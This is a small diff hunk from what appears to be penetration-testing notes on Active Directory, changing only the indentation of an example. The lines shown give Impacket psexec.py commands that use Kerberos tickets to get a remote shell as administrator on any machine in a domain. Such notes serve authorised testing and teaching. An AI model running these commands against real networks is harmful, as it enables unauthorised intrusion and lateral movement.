@@ -33,4 +33,4 @@ Notes - credentials are needed to run these commands on the domain controller. T
 <h6>Use psexec to obtain a shell on any machine in the domain</h6>
 
 	psexec.py <domain>/<user>@<hostname>.<fqdn> -no-pass -k
-  psexec.py home.local/administrator@TargetPC.home.local -no-pass -k
+  	psexec.py home.local/administrator@TargetPC.home.local -no-pass -k
